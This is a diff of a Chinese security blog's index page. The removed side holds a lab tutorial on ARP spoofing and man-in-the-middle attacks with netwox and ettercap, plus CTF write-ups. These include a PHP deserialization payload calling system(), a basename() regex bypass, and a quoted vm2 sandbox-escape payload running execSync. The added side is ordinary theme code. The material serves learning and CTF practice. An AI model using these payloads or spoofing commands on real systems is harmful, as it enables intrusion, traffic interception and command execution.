@@ -1,903 +1,357 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-
-  
-  <title>小叹</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>小叹</title><meta name="author"><meta name="copyright"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="小叹">
 <meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="小叹">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="小叹" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-<meta name="generator" content="Hexo 5.1.1"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">小叹</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-实验环境 vmware12 + KALI2020.2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/" class="article-date">
-  <time datetime="2020-05-30T07:43:56.350Z" itemprop="datePublished">2020-05-30</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="实验环境-vmware12-KALI2020-2"><a href="#实验环境-vmware12-KALI2020-2" class="headerlink" title="实验环境 vmware12 + KALI2020.2"></a>实验环境 vmware12 + KALI2020.2</h2><p>一：导入XP系统</p>
-<p>1过程</p>
-<ol>
-<li><p>在 Workstation Pro 中，选择<strong>文件</strong> &gt; <strong>打开</strong>。</p>
-</li>
-<li><p>浏览到 .ovf 或 .ova 文件，然后单击<strong>打开</strong>。</p>
-</li>
-<li><p>键入虚拟机名称，再键入或浏览至虚拟机文件目录，然后单击<strong>导入</strong>。</p>
-<p>Workstation Pro 会执行 OVF 规范一致性和虚拟硬件合规性检查。状态栏中会显示导入进度。</p>
-</li>
-<li><p>如果导入失败，可单击<strong>重试</strong>重新尝试操作，或者单击<strong>取消</strong>以取消导入。</p>
-<p>如果重新尝试导入，Workstation Pro 会放宽 OVF 规范一致性与虚拟硬件合规性检查，但您可能无法使用 Workstation Pro 中的虚拟机。</p>
-</li>
-</ol>
-<h2 id="二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）"><a href="#二：关闭win-XP-和win10防火墙（XP的系统已经默认关闭了）" class="headerlink" title="二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）"></a>二：关闭win XP 和win10防火墙（XP的系统已经默认关闭了）</h2><p>同时关闭XP的防火墙。</p>
-<p>对win10进行设置：</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234440730.png" alt="image-20200529234440730"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234451763.png" alt="image-20200529234451763"></p>
-<h3 id="二（补充）：如果无法点击高级设置。就搜索防火墙"><a href="#二（补充）：如果无法点击高级设置。就搜索防火墙" class="headerlink" title="二（补充）：如果无法点击高级设置。就搜索防火墙"></a>二（补充）：如果无法点击高级设置。就搜索防火墙</h3><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530171703863.png" alt="image-20200530171703863"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234504869.png" alt="image-20200529234504869"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200529234516814.png" alt="image-20200529234516814"></p>
-<h2 id="三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"><a href="#三：（可跳过-用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式" class="headerlink" title="三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式"></a>三：（可跳过/用于解决VM桥接模式下无法联网的问题）修改网络为桥接模式</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153718746.png" alt="image-20200530153718746"></h2><p>【按住ctrl左键点击vm8和可以联网的网卡，右键vm8点击桥接。会出现新的网卡。右键新的网络，点击“属性“，找到“IPv4”，打开其”属性“，默认为自动获取IP，改成手动设置，IP填写你局域网中的IP，比如我的可以填写为192.168.31.109（只要符合你们局域网IP范围就可以），子网掩码默认，在默认网关处填写路由器的IP，比如我的是192.168.31.1；】<strong>该步骤是解决win10桥接下无法联网的解决办法，<u>可跳过</u></strong></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530174900133.png" alt="image-20200530174900133"></p>
-<p>默认网关用ipconfig查看。</p>
-<p>【在下方的DNS处，可以填写比较好用的114.114.114.114和223.5.5.5。然后确定。<br>】<em><em>这步骤同上。</em>，若虚拟机有网则不需要</em></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530175305661.png" alt="image-20200530175305661"></p>
-<h2 id="四：修改虚拟机网络配置"><a href="#四：修改虚拟机网络配置" class="headerlink" title="四：修改虚拟机网络配置"></a>四：修改虚拟机网络配置</h2><p>1.打开虚拟网络编辑器</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210737893.png" alt="image-20200601210737893"></p>
-<p>2.</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180640690.png" alt="image-20200530180640690"></p>
-<p>这里的网卡需要设置成本机名字的网卡。比如：AC 9462</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530180917529.png" alt="image-20200530180917529"></p>
-<p>3.选择桥接模式</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601210915755.png" alt="image-20200601210915755"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154028167.png" alt="image-20200530154028167"></p>
-<p>将XP和kali的设置都设置成桥接模式。如上图。</p>
-<p><strong>要保证虚拟机之间虚拟机主机 主机虚拟机可以互ping，并且在同一网段</strong></p>
-<p><strong>如果都能成功，则修改完成。</strong></p>
-<h2 id="五：安装netwox"><a href="#五：安装netwox" class="headerlink" title="五：安装netwox"></a>五：安装netwox</h2><p>1.sudo vi /etc/apt/sources.list</p>
-<p>2.在后面添加源：</p>
-<pre><code class="text">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
-deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre>
-<p>3.i是插入。</p>
-<blockquote>
-<p>sudo apt-get update</p>
-<p>sudo apt-get install netwox</p>
-</blockquote>
-<h2 id="五：运行Netwox工具包，对靶机进行假冒源地址"><a href="#五：运行Netwox工具包，对靶机进行假冒源地址" class="headerlink" title="五：运行Netwox工具包，对靶机进行假冒源地址"></a>五：运行Netwox工具包，对靶机进行假冒源地址</h2><p>本机：192.168.31.21</p>
-<p>XP：192.168.31.128</p>
-<p>kali：192.168.31.129</p>
-<p>1—互相ping通，记录mac地址和IP。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132059565.png" alt="image-20200530132059565"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530132111925.png" alt="image-20200530132111925"></p>
-<p>2.</p>
-<p>记下kali xp 物理机的 IP和MAC地址。如果显示上图则表示成功。在kali上输入：<strong>每个人输入的不一样，这个终端<u>别关掉</u>它不会出现回显的</strong></p>
-<blockquote>
-<p>sudo netwox 80 “00:0c:29:c8:27:5d”（kali的MAC地址） -i “192.168.31.21”    （win10）//告诉靶机B，靶机C192.168.31.21的MAC地址 00:0c:29:c8:27:5d</p>
-</blockquote>
-<p>3.</p>
-<p>在kali中再打开一个终端sudo wireshark</p>
-<p>切换到XP系统，输入arp -a</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530130418592.png" alt="image-20200530130418592"></p>
-<p>可以看见kali正在欺骗XP（192.168.31.128）win10的mac地址为00:0c:29:c8:27:5d（而实际上这其实是kali的mac地址）</p>
-<p><strong><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530131219459.png" alt="image-20200530131219459"></strong></p>
-<p>可以发现已经欺骗成功了。这个时候XP上ping 192.168.31.21发现无法成功。</p>
-<p><strong>这样就完成了一次简单的ARP欺骗。</strong></p>
-<h2 id="六：ettercap-实现中间人攻击"><a href="#六：ettercap-实现中间人攻击" class="headerlink" title="六：ettercap 实现中间人攻击"></a>六：ettercap 实现中间人攻击</h2><p>1.</p>
-<blockquote>
-<p>sudo ettercap -G(新版ettercap,旧版在下面)</p>
-</blockquote>
-<p>2.首先选择Sniff-&gt;ARP poioning</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154601623.png" alt="image-20200530154601623"></p>
-<p>3.</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154637446.png" alt="image-20200530154637446"></p>
-<p>从我们发现的主机中，选择我们的目标。从<code>Hosts</code>菜单栏中选择</p>
-<p>3.<code>Hosts list</code>。</p>
-<p>4.scan for hosts</p>
-<ol>
-<li>从列表中选择<code>192.168.31.21</code>，并点击<code>Add to Target 1</code>。</li>
-<li>之后选择<code>192.168.31.128，之后点击</code>Add to Target 2`。</li>
-<li>现在我们检查目标：在<code>Targets</code>菜单中，选择<code>Current targets</code>。</li>
-</ol>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530154508637.png" alt="image-20200530154508637"></p>
-<p>5.然后点击左上角的箭头开始攻击。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200601184923242.png" alt="image-20200601184923242"></p>
-<p>可以发现mac地址已经全部修改为kali的mac地址。</p>
-<p>6.查看wireshark，仔细观察可以看见kali一直在广播对XP和win10进行ARP欺骗。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" alt="image-20200530153450571"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" alt="image-20200530153539587"></p>
-<h2 id="旧版"><a href="#旧版" class="headerlink" title="旧版"></a>旧版</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203006988.png" alt="image-20200530203006988"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530203019644.png" alt="image-20200530203019644"></p>
-<p>然后右上角start</p>
-<h2 id="七：使用netwox进行中间人攻击"><a href="#七：使用netwox进行中间人攻击" class="headerlink" title="七：使用netwox进行中间人攻击"></a>七：使用netwox进行中间人攻击</h2><p>将kali的MAC地址伪装成XP，向WIN10发送ARP Reply</p>
-<p>将kali的MAC地址伪装成win10，向XP发送ARP Reply</p>
-<p>一：在kali上开两个窗口分别输入</p>
-<blockquote>
-<p>sudo netwox 80 (kali MAC地址)  -i  “XP’s IP”</p>
-<p>sudo netwox 80 (kali MAC地址)  -i  “Win10’s IP”</p>
-</blockquote>
-<p>二：arp -a(XP)</p>
-<p>查看并记录XP和WIN10的ARP表变化</p>
-<p>三：查看、记录并分析kali、XP和WIN10上wireshark捕获的ARP报文</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153450571.png" alt="image-20200530153450571"></p>
-<p>可以看见kali不停的播放ARP广播实行欺骗。</p>
-<ul>
-<li><p>当XP发送数据给WIN10时，通过广播ARP 请求包，询问IP(win10)映射的MAC(win10)</p>
-</li>
-<li><p>同一网段的主机都会收到ARP请求包。win10会返回IP(WIN10)–MAC(WIN10)，攻击节点kali会返回IP(WIN10)–MAC(kali)，其他机器不做应答。</p>
-</li>
-<li><p>尽管win10也做出响应，但kali不断发送响应包，导致XP的ARP映射表保存了错误的映射。当xp想WIN10发送数据的时候，将会发送到kali的端口。若kali同时冒充XP和WIN10，则这就构成了中间人攻击。</p>
-</li>
-</ul>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200530153539587.png" alt="image-20200530153539587"></p>
-<p>而也可实现互相ping通，则可发现实验是成功的，kali成功的对win10和winXP之间的通信进行了欺骗。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/30/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%20vmware12%20+%20KALI2020.2/" data-id="ckemqkebl002mastyc8rp13nv" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-[网鼎杯 2020 朱雀组]phpweb" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/20/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb/" class="article-date">
-  <time datetime="2020-05-20T10:18:49.067Z" itemprop="datePublished">2020-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>fuzz一下发现报错信息中有call_user_func()。但是我太菜了绕不过。用payload：</p>
-<blockquote>
-<p>func=file_get_contents&amp;p=index.php</p>
-</blockquote>
-<p>看一下源码</p>
-<pre><code class="php">&lt;?php
-    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
-    function gettime($func, $p) &#123;
-        $result = call_user_func($func, $p);
-        $a= gettype($result);
-        if ($a == &quot;string&quot;) &#123;
-            return $result;
-        &#125; else &#123;return &quot;&quot;;&#125;
-    &#125;
-    class Test &#123;
-        var $p = &quot;Y-m-d h:i:s a&quot;;
-        var $func = &quot;date&quot;;
-        function __destruct() &#123;
-            if ($this-&gt;func != &quot;&quot;) &#123;
-                echo gettime($this-&gt;func, $this-&gt;p);
-            &#125;
-        &#125;
-    &#125;
-    $func = $_REQUEST[&quot;func&quot;];
-    $p = $_REQUEST[&quot;p&quot;];
-
-    if ($func != null) &#123;
-        $func = strtolower($func);
-        if (!in_array($func,$disable_fun)) &#123;
-            echo gettime($func, $p);
-        &#125;else &#123;
-            die(&quot;Hacker...&quot;);
-        &#125;
-    &#125;
-    ?&gt;</code></pre>
-<p>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</p>
-<pre><code>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</code></pre><p><code>&lt;?php</code><br><code>class Test &#123;</code><br>    <code>var $p = &quot;Y-m-d h:i:s a&quot;;</code><br>    <code>var $func = &quot;date&quot;;</code><br>    <code>function __destruct() &#123;</code><br>        <code>if ($this-&gt;func != &quot;&quot;) &#123;</code><br>            <code>echo gettime($this-&gt;func, $this-&gt;p);</code><br>        <code>&#125;</code><br>    <code>&#125;</code><br><code>&#125;</code></p>
-<p><code>$a = new Test();</code><br><code>$a -&gt; p=&quot;ls ../../../../../&quot;;</code><br><code>$a -&gt; func = &quot;system&quot;;</code><br><code>print_r(urlencode(serialize($a)));</code><br><img src="https://img-blog.csdnimg.cn/20200518171039755.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NoZW5aSUR1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><code>$a = new Test();</code></p>
-<p> <code>$a -&gt; p=&quot;cat /tmp/flagoefiu4r93&quot;;</code></p>
-<p> <code>$a -&gt; func = &quot;system&quot;; print_r(urlencode(serialize($a)));</code></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/20/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]phpweb/" data-id="ckemqkeb6001nastyb5mickv8" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-[Zer0pts2020]Can you guess it" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/19/%5BZer0pts2020%5DCan%20you%20guess%20it/" class="article-date">
-  <time datetime="2020-05-19T04:34:31.612Z" itemprop="datePublished">2020-05-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>可以看到有一个随机数，如果能够破解随机数就能得到flag，在这里卡了半天也没做出来：</p>
-<?php
-include 'config.php'; // FLAG is defined in config.php
-
-if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
-  exit("I don't know what you are thinking, but I won't let you read it :)");
-}
-
-if (isset($_GET['source'])) {
-  highlight_file(basename($_SERVER['PHP_SELF']));
-  exit();
-}
-
-$secret = bin2hex(random_bytes(64));
-if (isset($_POST['guess'])) {
-  $guess = (string) $_POST['guess'];
-  if (hash_equals($secret, $guess)) {
-    $message = 'Congratulations! The flag is: ' . FLAG;
-  } else {
-    $message = 'Wrong.';
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="n7EnZXbI9l"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '小叹',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: true,
+  isToc: false,
+  postUpdate: '2021-07-29 10:40:51'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
   }
-}
-?>
+  .justified-gallery img {
+    opacity: 1
+  }
 
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <title>Can you guess it?</title>
-  </head>
-  <body>
-    <h1>Can you guess it?</h1>
-    <p>If your guess is correct, I'll give you the flag.</p>
-    <p><a href="?source">Source</a></p>
-    <hr>
-<?php if (isset($message)) { ?>
-    <p><?= $message ?></p>
-<?php } ?>
-    <form action="index.php" method="POST">
-      <input type="text" name="guess">
-      <input type="submit">
-    </form>
-  </body>
-</html>
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<p>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而题目告诉FLAG就在config.php里，这道题就做完了。所以说，那个随机数就是个障眼法<br>可以发现发现，这个正则匹配了config.php/为$_SERVER[‘PHP_SELF’]的结尾</p>
-<pre><code>/config\.php\/*$/i
-1</code></pre><p>老套路了，可以用%0d之类的来污染绕过，这样仍然访问得到index.php:</p>
-<pre><code>/index.php/config.php/%0d</code></pre><p>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</p>
-<p>但是正则过滤了/config.php/*$/i。<br>从 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
-<blockquote>
-<p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php<br>var_dump(basename(“config.php/xff”)); // =&gt; config.php</p>
-<p>所以这样就能绕过正则了，payload：</p>
-</blockquote>
-<blockquote>
-<p>/index.php/config.php/%ff?source</p>
-</blockquote>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/19/[Zer0pts2020]Can%20you%20guess%20it/" data-id="ckemqkeb6001mastybx5tehnt" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-</article>
-
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-    <article id="post-[HFCTF2020]JustEscape" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/17/%5BHFCTF2020%5DJustEscape/" class="article-date">
-  <time datetime="2020-05-17T02:59:35.162Z" itemprop="datePublished">2020-05-17</time>
-</a>
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-  </div>
-  <div class="article-inner">
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>最近老遇到js的题目，表示完全不会。</p>
-<p>看网上的wp，是基于node.js的网站，如输入Error().stack 即可报错（同时发现VM沙箱机制）。</p>
-<p>这是网上的payload：</p>
-<pre><code class="javascript">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;
-    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
-    try&#123;
-        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
-    &#125;catch(e)&#123;
-        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="小叹" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i 